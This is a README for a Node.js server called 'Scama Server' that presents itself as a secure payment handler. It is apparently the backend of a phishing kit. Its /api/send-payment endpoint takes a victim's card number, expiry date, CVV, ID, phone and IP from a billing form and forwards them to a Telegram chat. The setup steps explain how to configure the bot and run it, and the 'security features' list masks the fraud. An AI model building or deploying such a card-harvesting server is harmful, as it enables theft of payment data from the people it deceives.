# Scama Server

A secure Node.js Express server for handling payment data and Telegram API integration.

## Features

- ✅ Secure payment data handling
- ✅ Telegram Bot API integration (server-side)
- ✅ News API integration
- ✅ Rate limiting and security headers
- ✅ CORS protection
- ✅ Input validation
- ✅ Error handling

## Setup

1. **Install dependencies:**
   ```bash
   npm install
   ```

2. **Configure the server:**
   - Edit `config.js` to update your Telegram bot token and chat ID
   - Add your News API key in `config.js` (optional)

3. **Start the server:**
   ```bash
   # Development mode with auto-restart
   npm run dev
   
   # Production mode
   npm start
   ```

4. **Access the application:**
   - Open your browser and go to `http://localhost:3000`
   - The billing form will now submit to the secure server

## API Endpoints

### POST /api/send-payment
Sends payment data securely to Telegram.

**Request Body:**
```json
{
  "cardholderName": "string",
  "cardholderId": "string", 
  "cardholderPhone": "string",
  "zipCode": "string",
  "city": "string",
  "cardNumber": "string",
  "expiryDate": "string",
  "cvv": "string",
  "clientIP": "string"
}
```

### GET /api/news
Fetches news articles from News API.

**Query Parameters:**
- `country` (optional): Country code (default: 'il')
- `category` (optional): News category (default: 'general')
- `pageSize` (optional): Number of articles (default: 10)

### GET /api/health
Health check endpoint.

## Security Features

- **Helmet.js**: Security headers
- **CORS**: Cross-origin resource sharing protection
- **Rate Limiting**: Prevents abuse (100 requests per 15 minutes)
- **Input Validation**: Server-side validation of all inputs
- **Error Handling**: Comprehensive error handling and logging

## Configuration

Edit `config.js` to customize:

- Telegram bot token and chat ID
- News API key and settings
- Server port and environment

## Dependencies

- **express**: Web framework
- **cors**: CORS middleware
- **helmet**: Security middleware
- **axios**: HTTP client for API calls
- **express-rate-limit**: Rate limiting middleware

## Development

The server includes:
- Auto-restart with nodemon in development
- Comprehensive logging
- Error handling
- Input validation
- Security middleware

## Notes

- The Telegram bot token is now stored securely on the server
- All API calls are made server-side to protect sensitive data
- The billing form has been updated with zip code and city fields
- News API integration is included for additional functionality



